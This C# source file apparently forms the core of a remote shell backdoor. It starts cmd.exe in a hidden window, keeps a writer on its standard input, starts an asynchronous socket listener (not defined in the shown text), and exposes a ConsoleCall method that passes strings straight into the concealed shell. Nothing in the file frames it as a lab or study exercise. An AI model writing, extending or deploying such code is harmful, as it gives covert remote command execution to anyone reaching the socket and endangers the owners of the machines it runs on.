using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace CMD
{
    public class Program
    {
        public static StreamWriter cmd_writer;

         static void Main(string[] args)
         {

             CreateCmdWindow();

             AsynchronousSocketListener.StartListening();
             
         }

        private static void CreateCmdWindow()
        {
            //creating a new process
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();

            // makes command line window hidden
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            //calling process name
            startInfo.FileName = "cmd.exe";

            //establish that I want to use the console as an output stream (receives input from my output)s
            startInfo.RedirectStandardInput = true;
            startInfo.UseShellExecute = false;

            process.StartInfo = startInfo;
            process.Start();

            cmd_writer = process.StandardInput;
         }

         public static void ConsoleCall(string cmd_output)
         {
             cmd_writer.WriteLine(cmd_output);
         }
    }
}